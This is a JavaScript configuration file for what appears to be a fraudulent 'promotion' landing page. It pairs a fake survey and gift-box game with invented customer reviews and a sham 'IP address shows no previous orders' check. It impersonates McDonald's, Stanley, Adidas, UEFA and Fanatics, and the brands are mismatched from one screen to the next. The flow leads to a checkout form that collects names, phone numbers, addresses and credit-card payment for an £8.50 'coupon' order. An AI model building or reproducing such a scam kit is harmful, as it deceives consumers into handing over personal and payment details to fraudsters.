const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

const baseUrl = document.querySelector("base[href]")?.href.replace('/index.html', "");
const baseHref = window.location.protocol + "//" + window.location.host;

const landingUrl = baseHref + window.location.pathname;
const imageBase = baseUrl ?? landingUrl;

(function (exp) {
  const countryCode = "gb";
  const lang = "en-GB";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Size: ",
    arr: ["XS", "S", "M", "M/L", "L", "L/XL", "XL", "XXL"],
  };

  // I FILL THIS INFO IN MAIN.JS
  const mainProduct = {
    header: "",
    name: "",
    oldPrice: "",
    newPrice: "",
    selectText: "",
    coupon: "",
    text: `
    Congratulations!<br><br>
    You participated in the Stanley promotion: you have the opportunity to buy the Stanley Quencher H2.0 Tumbler with Ice Mold for only <b>£37</b>!
  `,
  };

  const notifications = [
    // {
    //   user: "Manuel S*****",
    //   location: "Barcelona, Spain",
    //   action: "Just received the jewellery for 1.95 euros!",
    //   timeago: "15 seconds ago",
    // },
    // {
    //   user: "Carlos B******",
    //   location: "Madrid, Spain",
    //   action: "Just received the jewellery for 1.95 euros!",
    //   timeago: "25 seconds ago",
    // },
  ];

  const reviewsArr = [
    {
      name: "Matthew",
      time: "One day ago",
      header: "This is incredible!",
      product: "26468782",
      review: "As a football fan for many years, I was very surprised by the quality of the Spanish national team jersey at such a reasonable price 😊",
    },
    {
      name: "Luke",
      time: "Two days ago",
      header: "Fantastic! I have no words.",
      product: "26468789",
      review: "I decided to buy the Spanish national team jersey for the first time and now I enjoy it every time I support my team, thank you.",
    },
    {
      name: "Valentina",
      time: "Two days ago",
      header: "Simply great.",
      product: "26468785",
      review: "The quality of the jersey is amazing, and the size is perfect! Thank you, I will recommend it to my friends.",
    },
    {
      name: "James",
      time: "Four days ago",
      header: "I like it",
      review: "Honestly, I love watching football, and the new Spanish national team jersey was exactly what I needed.",
    },
    {
      name: "Martina",
      time: "Seven days ago",
      header: "Wow, I absolutely love this product!",
      product: "26468784",
      review: "At first, I thought the jersey was expensive, but fortunately, I bought it and now I enjoy the best matches with it. Thank you!",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "REVIEWS AND RATINGS",
    percent: "99%",
    rec: "comments on this promotion",
  };

  const questions = {
    _of: "Question {1} of {2}: ",
    arr: [
      {
        q: "Have you ever ordered products from McDonald's?",
        a: [
          "Yes, I order frequently",
          "Yes, I order rarely",
          "I have never ordered",
        ],
      },
      {
        q: "Should McDonald's continue with this type of advertising campaigns?",
        a: ["Yes, of course!", "Yes, but change the promotional menu", "No"],
      },
      {
        q: "Would you recommend our products to your friends?",
        a: ["Yes", "No"],
      },
    ],
  };

  const check = {
    title: "Your answer will be reviewed",
    arr: [
      "You have answered question 3 of 3",
      "Your IP address shows no previous orders",
      "Your answer has been verified",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Thank you for participating in the survey!",
        button: "Try your luck",
        text: `
<center>
    To get the McDonald's menu at a promotional price, you need to choose the correct gift box.
    <br><br>
    You have 3 attempts, good luck!
</center>
            `,
      },
    },
    first: {
      texts: {
        header: "Oh, no...",
        button: "Try again",
        text: `
<center>
    Unfortunately, this gift is empty. You have two more attempts, good luck!
</center>
            `,
      },
    },
    win: {
      texts: {
        header: "Adidas England Home Shirt 24",
        button: "Get the coupon",
        text: `
<center>
    <p style="color: #ffffff"></p>
    <br>
    Click "Get the coupon", fill out the form, and pay for the order.
    <br><br>
    Receive a text message with the coupon and instructions on how to activate it.
    <br><br>
    The coupon can be activated at any time and requires no additional payment.
</center>
            `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "Personal Information",
      fields: {
        name: {
          enabled: true,
          field: "Name",
        },
        family: {
          enabled: true,
          field: "Surname",
        },
        phone: {
          enabled: true,
          field: "Phone number",
        },
        email: {
          enabled: true,
          field: "Email",
        },
      },
    },
    delivery: {
      title: "Delivery",
      fields: {
        city: {
          enabled: true,
          field: "City",
        },
        address: {
          enabled: true,
          field: "Delivery address",
        },
        zip: {
          enabled: true,
          field: "Postcode",
        },
      },
    },
    payment: {
      title: "Payment Methods",
      creditCard: "Online payment with credit card",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Order Details",
      oldPrice: "84.99",
      newPrice: "£8.50",
      size: "Size",
      subTotal: {
        title: "Subtotal",
        amount: "£8.50",
      },
      delivery: {
        title: "Delivery",
        amount: "£0.00",
      },
      total: {
        title: "Total",
        amount: "£8.50",
      },
      checkoutButton: "Pay for your order",
    },
  };

  const products = [
    {
      id: "26468784",
      name: "Adidas England Home Shirt 24",
      miniImg: "./src/img/slide3.png",
      images: ["./src/img/slide3.png"],
    },
    {
      id: "26468782",
      name: "Adidas England Home Shirt 24",
      miniImg: "./src/img/slide1.png",
      images: ["./src/img/slide1.png"],
    },
    {
      id: "26468783",
      name: "Adidas England Home Shirt 24",
      miniImg: "./src/img/slide2.png",
      images: ["./src/img/slide2.png"],
    },
  ];


  const footer = {
    cr: "© 2024, UEFA and Fanatics, Inc.. All rights reserved. No portion of this site may be reproduced or duplicated without the express permission of UEFA and/or Fanatics (as applicable). The words UEFA, UEFA Nations League, UEFA Nations League Finals, Finalissima, UEFA U21 Championships, UEFA EURO and UEFA Women’s EURO and all other UEFA marks, names, mascots and trophies are the property, registered trademarks, designs and/or copyright of UEFA. Store maintained and operated by Fanatics (International) Limited.",
  };

  const pathImgBox = {
    lid: "./src/img/box-lid.png",
    lidIOs: "./src/img/box-lid-ios.png",
    inner: "./src/img/box-inner.png",
    innerGift: "./src/img/box-inner-gift.png",
    box: "./src/img/box.png",
    boxModal: "./src/img/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");


  ///
  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }
  const product = products.find((pr) => pr.id === ind);
  const mainProduct = window.__config.mainProduct;

  const localImageUrl = product.images[0].replace("./", "/");
  const imageUrl = imageBase + localImageUrl;

  document.querySelector("input[name='product_name']").value =
    mainProduct.name + ": " + product.name;
  document.querySelector("input[name='product_image']").value = imageUrl;

  return product;
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) => localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
  document
    .querySelector(".checkout_header")
    .setAttribute("style", "display: flex");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};


document.querySelector("form").addEventListener("submit", (e) => {
  document.querySelector("#submitButton").setAttribute("disabled", "true");
  const spinner = document.createElement("div");
  spinner.classList.add("spinner__", "submitButton");
  document.querySelector("#submitButton").appendChild(spinner);
});